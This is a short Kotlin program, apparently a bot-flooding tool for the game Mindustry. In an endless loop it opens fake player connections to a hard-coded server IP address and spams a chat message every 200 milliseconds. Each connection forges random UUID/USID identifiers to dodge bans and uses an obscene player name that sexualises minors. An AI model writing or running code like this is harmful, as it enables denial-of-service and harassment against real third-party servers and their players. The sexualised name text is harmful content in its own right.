package io.lucin

import arc.math.Rand
import arc.struct.Seq
import arc.util.serialization.Base64Coder
import io.lucin.core.Entity
import mindustry.Vars
import mindustry.core.*
import mindustry.gen.Groups
import mindustry.gen.SendChatMessageCallPacket
import mindustry.net.Packets.ConnectPacket
import java.lang.Thread.sleep

fun main() {
    init()
    while (true) {
        val player = Entity.EntityBuilder(false, packet(), "109.94.209.233", 6570, 6570)
        sleep(200)
        val packet = SendChatMessageCallPacket()
        packet.message = "приветик!!!!"
        player.client.sendTCP(packet)
        sleep(200)
    }
    while (true) {
    }
}

private fun init() {
    Groups.init()
    Vars.world = World()

    Vars.content = ContentLoader()
    Vars.content.createBaseContent()

    Vars.state = GameState()

    Version.build = 140
}

private fun packet(): ConnectPacket {
    val packet = ConnectPacket()

    packet.version = -1
    packet.versionType = "official"

    packet.name = "loli ${Rand().random(-99999, 99999).toString()} boobs"
    packet.color = 0
    packet.locale = "chlen mastera"

    packet.mods = Seq()
    packet.mobile = true

    packet.uuid = uuid()
    packet.usid = usid()

    return packet
}

private fun uuid(): String {
    val bytes = ByteArray(8)
    Rand().nextBytes(bytes)
    return String(Base64Coder.encode(bytes))
}

private fun usid(): String {
    val result = ByteArray(8)
    Rand().nextBytes(result)
    return String(Base64Coder.encode(result))
}
